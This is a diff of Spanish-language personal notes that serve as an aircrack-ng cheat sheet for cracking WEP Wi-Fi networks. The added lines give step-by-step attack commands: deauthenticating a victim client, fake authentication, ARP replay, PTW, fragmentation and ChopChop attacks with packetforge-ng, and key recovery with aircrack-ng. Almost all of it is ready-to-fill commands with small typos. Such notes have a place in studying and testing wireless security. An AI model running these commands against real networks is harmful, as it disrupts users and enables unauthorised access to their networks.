@@ -20,12 +20,14 @@ airmon-ng check // Muestra procesos que pueden ser problemáticos
 airmon-ng check kill // Termina procesos problemáticos
 airmon-ng start wlan0 // Poner en modo monitor la interfaz
 airmon-ng stop mon0 // Para el modo monitor
-airmon-ng start wlan0 3 // Modo monitor en ese canal (útil para filtrar solo el canal de la red que queramos)
+airmon-ng start wlan0 [channel] // Modo monitor en ese canal (útil para filtrar solo el canal de la red que queramos)
   Comprobar con iwlist mon0 channel
 airodump-ng mon0 // Empezar captura de paquetes
-airodump-ng -c 3 mon0
+airodump-ng -c [channel] mon0
 macchanger -s mon0 // Muestra nuestra MAC
-airodump-ng -c 3 --bssid MAC-AP -w NOMBRE-CAPTURA mon0
+
+airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA mon0
+
 wireshark NOMBRE-CAPTURA
 
 #########################
@@ -36,18 +38,55 @@ aireplay-n -9 -i wlan1 mon0 // Probar inyección en una segunda tarjeta que teng
 #######################
 
 Fake auth Atack
-aireplay-ng -1 0 -e ESSID-AP -a MAC-AP -h NUESTRA-MAC mon0 (Puede que haga falta una MAC válida si tienen MAC filtering)
+aireplay-ng -1 0 (cada cuanto se repite el fakeauth) -e ESSID-AP -a MAC-AP -h NUESTRA-MAC mon0 (Puede que haga falta una MAC válida si tienen MAC filtering)
 
 Deauth Attack
 aireplay-ng -0 1 (num packets to send, 0 para infinito) -a MAC-AP -c VICTIM-MAC mon0
 
-Arp Replay? El más fiable
+ARP Replay El más fiable
 aireplay-ng -1 0 -e ESSID-AP -a MAC-AP -h NUESTRA-MAC mon0
 aireplay-ng -3 -b MAC-AP -h NUESTRA-MAC mon0
-(Para acelerar el proceso y obtener un paquete ARP que poder reenviar) aireplay-ng -0 1 (num packets to send, 0 para infinito) -a MAC-AP -c VICTIM-MAC mon0
+(Para acelerar el proceso y obtener un paquete ARP que poder reenviar, hacemos un deauth) aireplay-ng -0 1 (num packets to send, 0 para infinito) -a MAC-AP -c VICTIM-MAC mon0
 
 #####################
 
 aircrack-ng -0 (con colorines) CAPTURE-FILENAME
+
+######################
+
+ATAQUE AP CON CLIENTE
+
+PTW Attack
+airmon-ng start wlan0 [channel]
+airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA mon0
+Recomendable hacer un fake auth para tener la MAC asociada y que sea más fiable
+aireplay-ng -1 0 -e ESSID-AP -a MAC-AP -h NUESTRA-MAC mon0
+aireplay-ng -2 -b MAC-AP -d FF:FF:FF:FF:FF:FF -f 1 (filtrar que sean paquetes con FromDS) -m 68 -n 86 (min y max ARP packet size) mon0
+  Cuando encuentra un paquete y le damos a "y" para reenviar, los #Data deberían subir mucho. Si no suben, Ctrl+C y probar con otro. Se puede hacer 
+aircrack-ng -0 -z -n 64 (num bits de WEP key) CAPTURE-FILENAME
+
+aireplay-ng -2 -r CAPTURA-CON-PAQUETE-VALIDO mon0
+
+######################
+
+ATAQUE AP SIN CLIENTE
+
+airmon-ng start wlan0 [channel]
+airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA mon0
+Primero hacer un fakeauth para mantener asociada nuestra MAC
+aireplay-ng -1 60 (para mantener el fakeauth cada 60 seg) -e ESSID-AP -a/-b MAC-AP -h NUESTRA-MAC mon0
+
+Fragmentation Attack
+Espera un paquete, y cuando lo recibe comienza el ataque. Hace falta que la MAC usada esté asociada al AP. Hace falta estar razonablemente cerca del AP para que no falte ningún paquete
+aireplay-ng -5 -b MAC-AP -h MAC-NUESTRA mon0
+packetforge-ng -0 -a MAP-AP -h NUESTRA-MAC -l SOURCE-IP -k BROADCAST-IP -y .XOR-FILE -w DEST-FILENAME
+OPCIONAL tcpdump -n -vvv -e -s0 -r DEST-FILENAME-ANTERIOR
+aireplay-ng -2 -r DEST-FILENAME-ANTERIOR mon0
+
+ChopChop Attack
+aireplay-ng -4 -b MAC-AP -h NUESTRA-MAC mon0
+OPCIONAL tcpdump -s 0 -n -e -r ARCHIVO-OBTENIDO-.CAP
+packetforge-ng -0 -a MAC-AP -h NUESTRA-MAC -l SOURCE-IP (Obtenida con tcpdump en paso anterior) -k BROADCAST-IP -y .XOR-FILE -w DEST-FILENAME
+
 
 
